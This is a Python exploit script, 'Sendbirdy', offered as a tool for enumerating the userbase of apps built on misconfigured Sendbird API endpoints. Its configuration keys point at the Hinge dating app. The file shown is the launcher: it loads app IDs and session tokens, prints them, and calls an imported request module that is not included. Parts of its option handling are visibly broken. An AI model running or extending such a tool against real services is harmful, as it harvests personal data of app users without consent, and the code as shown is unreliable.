#!/usr/bin/python
# Exploit Title: Sendbirdy: Userbase Enumeration via Directory Traversal on Improperly Secured Sendbird API Endpoints
# Date: 06-09-2020
# Exploit Author: Tyler Butler, @tbutler0x90, tbutler.org
# Vendor Homepage: https://sendbird.com/
# Version: Jios/3.0.178
# Details:

import requests
import sys
import time
import getopt
from pyjavaproperties import Properties

import lib.utils.constants as c
import lib.utils.jsonformatter as formatter
import lib.core.request_sender as requester
import lib.core.module_parser as parser


def print_help():
    print(c.usage)

def print_options_header():
    print('{x}------- Global Options ----------')


def print_options_changed(user_option, value):
    print('{x}-------' + user_option + " Value: " + value)

def set_app_args(arg, p):
    global appID, requestLimit, usersToEnumerate, sessionKey
    try:
        print("{!}-----[INFO]--- Setting " + arg + " application properties from proj.properties")

        user_app_id = arg + "-ID"
        appID = str(p.getProperty(user_app_id))
        user_session_token = arg + "-TOKEN"
        sessionKey = str(p.getProperty(user_session_token))
        requestLimit = int(p.getProperty("REQUESTLIMIT"))
        usersToEnumerate = int(p.getProperty("USERSTOENUM"))
        print("                  | API:" + appID)
        print("                  | Session Token:" + sessionKey)
        print("                  | REQUESTLIMIT:" + str(requestLimit))
        print("                  | USERSTOENUM:" + str(usersToEnumerate))
        print("                  | OUTFILE:" + str(p.getProperty("OUTFILE")))
    except Exception as e:
        print(c.indent_msg + c.indent_err + str(e))
    return


def start_sendbirdy():
    named_tuple = time.localtime()  # get struct_time
    time_string = time.strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
    print("{!}-----[INFO]--- Starting Sendbirdy -----[" + time_string + "]")
    try:
        requester.requestSender(c.app)
    except RuntimeError as e:
        print(c.indent_msg + c.indent_err + e)
    return


def main():
    p = Properties()
    p.load(open('res/proj.properties'))

    print(c.sendBirdyHeader)
    ts = time.gmtime()
    ts2 = time.asctime(ts)

    if (len(sys.argv)) == 1:  # if no arguments are provided, print usage and exit
        print(c.errorMsg + c.askForHelp)
        print("{!}-----[Settings]--- Workspace: " + p['WORKSPACE'])
        print("{!}-----[Settings]--- hinge-id: " + p['HINGE-ID'])
        print("{!}-----[Settings]--- hinge-token: " + p['HINGE-TOKEN'])
        sys.exit(0)

    # Get Options

    options, remainder = getopt.getopt(sys.argv[1:], 'o:v', ['help',
                                                             'app=',
                                                             'put=',
                                                             'interactive=',
                                                             'version',
                                                             ])
    for opt, arg in options:
        if opt in ('-h', '--help'):
            print_help()
        elif opt in ('-a', '--app'):
            c.app = arg
        elif opt in ('-i', '--interactive'):
            if arg == "yes":
                interactive_mode = True
        elif opt == ('-i', '--interactive'):
            if arg != "yes":
                print("interactive")
        start_sendbirdy()
        sys.exit(0)


main()
